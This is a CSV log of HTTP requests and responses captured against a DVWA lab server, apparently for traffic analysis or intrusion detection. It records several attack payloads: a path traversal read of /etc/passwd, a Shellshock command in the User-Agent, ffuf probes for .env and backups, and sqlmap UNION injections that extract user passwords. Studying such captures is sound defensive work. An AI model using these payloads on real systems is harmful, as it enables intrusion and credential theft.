frame.time,ip.src,tcp.srcport,ip.dst,tcp.dstport,http.request.method,http.request.uri,http.request.version,http.user_agent,http.host,http.response.version,http.response.code,http.response.phrase,http.content_length
Aug 28\, 2025 15:19:49.561541151 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/vulnerabilities/sqli/,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:19:51.042682880 WIB,192.168.19.129,59898,192.168.19.128,80,GET,/dvwa/vulnerabilities/fi/?page=include.php,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,192.168.19.128,,,,
Aug 28\, 2025 15:19:51.108280403 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/vulnerabilities/fi/?page=include.php,,,,HTTP/1.1,200,OK,4083
Aug 28\, 2025 15:19:54.842521041 WIB,192.168.19.129,59898,192.168.19.128,80,GET,/dvwa/vulnerabilities/xss_s/,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,192.168.19.128,,,,
Aug 28\, 2025 15:19:54.883087795 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/vulnerabilities/xss_s/,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:20:05.209717413 WIB,192.168.19.129,59898,192.168.19.128,80,POST,/dvwa/vulnerabilities/xss_s/,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,192.168.19.128,,,,65
Aug 28\, 2025 15:20:05.367018528 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/vulnerabilities/xss_s/,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:20:10.724064749 WIB,192.168.19.129,59898,192.168.19.128,80,GET,/dvwa/logout.php,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,192.168.19.128,,,,
Aug 28\, 2025 15:20:10.780062192 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/logout.php,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:10.801421641 WIB,192.168.19.129,59898,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0,192.168.19.128,,,,
Aug 28\, 2025 15:20:10.844758137 WIB,192.168.19.128,80,192.168.19.129,59898,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:18.920413961 WIB,192.168.19.129,60850,192.168.19.128,80,GET,/dvwa/vulnerabilities/fi/?page=../../etc/passwd,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,
Aug 28\, 2025 15:21:18.967764733 WIB,192.168.19.128,80,192.168.19.129,60850,,/dvwa/vulnerabilities/fi/?page=../../etc/passwd,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:19.522071276 WIB,192.168.19.129,60866,192.168.19.128,80,POST,/dvwa/vulnerabilities/exec/,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,20
Aug 28\, 2025 15:21:19.555118959 WIB,192.168.19.128,80,192.168.19.129,60866,,/dvwa/vulnerabilities/exec/,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:25.155438927 WIB,192.168.19.129,41396,192.168.19.128,80,OPTIONS,/dvwa/login.php,HTTP/1.1,curl/8.14.1,192.168.19.128,,,,
Aug 28\, 2025 15:21:25.176466368 WIB,192.168.19.128,80,192.168.19.129,41396,,/dvwa/login.php,,,,HTTP/1.1,200,OK,1289
Aug 28\, 2025 15:21:25.724672290 WIB,192.168.19.129,41406,192.168.19.128,80,GET,/dvwa/index.php,HTTP/1.1,() { :;}; /bin/bash -c 'id',192.168.19.128,,,,
Aug 28\, 2025 15:21:25.744079088 WIB,192.168.19.128,80,192.168.19.129,41406,,/dvwa/index.php,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:32.203630366 WIB,192.168.19.129,59436,192.168.19.128,80,GET,/dvwa/admin,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
Aug 28\, 2025 15:21:32.204077899 WIB,192.168.19.129,59432,192.168.19.128,80,GET,/dvwa/.env,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
Aug 28\, 2025 15:21:32.204088170 WIB,192.168.19.129,59434,192.168.19.128,80,GET,/dvwa/dashboard,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
Aug 28\, 2025 15:21:32.204090299 WIB,192.168.19.129,59438,192.168.19.128,80,GET,/dvwa/config,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
Aug 28\, 2025 15:21:32.204257968 WIB,192.168.19.129,59458,192.168.19.128,80,GET,/dvwa/backup.zip,HTTP/1.1,Fuzz Faster U Fool v2.1.0-dev,192.168.19.128,,,,
Aug 28\, 2025 15:21:32.205079750 WIB,192.168.19.128,80,192.168.19.129,59436,,/dvwa/admin,,,,HTTP/1.1,404,Not Found,293
Aug 28\, 2025 15:21:32.205247088 WIB,192.168.19.128,80,192.168.19.129,59432,,/dvwa/.env,,,,HTTP/1.1,404,Not Found,292
Aug 28\, 2025 15:21:32.205658656 WIB,192.168.19.128,80,192.168.19.129,59434,,/dvwa/dashboard,,,,HTTP/1.1,404,Not Found,297
Aug 28\, 2025 15:21:32.205892581 WIB,192.168.19.128,80,192.168.19.129,59438,,/dvwa/config,,,,HTTP/1.1,301,Moved Permanently,327
Aug 28\, 2025 15:21:32.206201595 WIB,192.168.19.128,80,192.168.19.129,59458,,/dvwa/backup.zip,,,,HTTP/1.1,404,Not Found,298
Aug 28\, 2025 15:20:53.732176472 WIB,192.168.19.129,39054,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:53.755853261 WIB,192.168.19.128,80,192.168.19.129,39054,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:53.822776843 WIB,192.168.19.129,39068,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:53.854884211 WIB,192.168.19.128,80,192.168.19.129,39068,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:20:54.002500864 WIB,192.168.19.129,39084,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.023128992 WIB,192.168.19.128,80,192.168.19.129,39084,,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28column_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28column_type%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:54.034019526 WIB,192.168.19.129,39088,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.057249002 WIB,192.168.19.128,80,192.168.19.129,39088,,/dvwa/login.php,,,,HTTP/1.1,200,OK,1289
Aug 28\, 2025 15:20:54.109066966 WIB,192.168.19.129,39098,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28%60user%60%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28avatar%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28first_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28last_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28user_id%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20dvwa.users%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.132498372 WIB,192.168.19.128,80,192.168.19.129,39098,,/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28%60user%60%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28avatar%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28first_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28last_name%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28password%20AS%20NCHAR%29%2C0x20%29%2CIFNULL%28CAST%28user_id%20AS%20NCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%20FROM%20dvwa.users%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:20:54.141969496 WIB,192.168.19.129,39106,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:20:54.170821322 WIB,192.168.19.128,80,192.168.19.129,39106,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:00.980097259 WIB,192.168.19.129,39132,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:01.001907706 WIB,192.168.19.128,80,192.168.19.129,39132,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:01.042810491 WIB,192.168.19.129,39144,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:01.067310371 WIB,192.168.19.128,80,192.168.19.129,39144,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:07.331728716 WIB,192.168.19.129,37670,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.360229392 WIB,192.168.19.128,80,192.168.19.129,37670,,/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:07.399462430 WIB,192.168.19.129,37684,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.429534115 WIB,192.168.19.128,80,192.168.19.129,37684,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
Aug 28\, 2025 15:21:07.558349896 WIB,192.168.19.129,37696,192.168.19.128,80,GET,/dvwa/vulnerabilities/sqli/?id=1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28schema_name%2F%2A%2A%2FAS%2F%2A%2A%2FNCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%2F%2A%2A%2FFROM%2F%2A%2A%2FINFORMATION_SCHEMA.SCHEMATA%23&Submit=Submit,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.578334138 WIB,192.168.19.128,80,192.168.19.129,37696,,/dvwa/vulnerabilities/sqli/?id=1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CCONCAT%280x716b7a7171%2CJSON_ARRAYAGG%28CONCAT_WS%280x676277646964%2CIFNULL%28CAST%28schema_name%2F%2A%2A%2FAS%2F%2A%2A%2FNCHAR%29%2C0x20%29%29%29%2C0x716a717671%29%2F%2A%2A%2FFROM%2F%2A%2A%2FINFORMATION_SCHEMA.SCHEMATA%23&Submit=Submit,,,,HTTP/1.1,302,Found,0
Aug 28\, 2025 15:21:07.593102643 WIB,192.168.19.129,37702,192.168.19.128,80,GET,/dvwa/login.php,HTTP/1.1,sqlmap/1.9.6#stable (https://sqlmap.org),192.168.19.128,,,,
Aug 28\, 2025 15:21:07.621196110 WIB,192.168.19.128,80,192.168.19.129,37702,,/dvwa/login.php,,,,HTTP/1.1,200,OK,
